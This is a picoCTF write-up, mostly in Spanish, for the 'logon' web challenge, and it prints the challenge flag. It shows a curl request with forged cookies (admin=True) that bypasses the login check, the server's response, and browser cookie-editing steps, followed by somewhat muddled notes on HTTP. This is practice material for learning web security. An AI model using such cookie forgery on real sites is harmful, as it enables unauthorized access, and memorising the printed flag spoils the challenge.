# logon

## Objetivos
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/44573/` ([link](https://jupiter.challenges.picoctf.org/problem/44573/)) or http://jupiter.challenges.picoctf.org:44573



## Solución 
```bash
**Flag**: `picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}`

┌──(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/44573/flag -H "Cookie: password=admin; username=admin; admin=True "
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Factory Login</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation" class="active"><a href="/">Home</a>
                    </li>
                    <li role="presentation"><a href="/logout" class="btn btn-link pull-right">Sign Out</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Factory Login</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF 2019</p>
        </footer>

    </div>
</body>

</html>                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]


```

## Notas adicionales 
https://concepto.de/http/

Cookie: Archivo pequeño que envía un servidor web al disco duro del internauta que lo visita con información sobre sus preferencias y pautas de navegación.

descargamos esta extensión https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search

en la pagina clickeamos en el icono de la galleta mordida y ahí nos dirigimos a la cookie admin, cambiamos `admin: False`   por `admin: True' 

Esta infromación se debe al http request, cuando el cliente hace una petición al navegador, y cuando el servidor responde se usa el protocolo `http:response`

En este proceso el servidor utilizo gets y post, para la comunicación. 

https://diego.com.es/headers-del-protocolo-http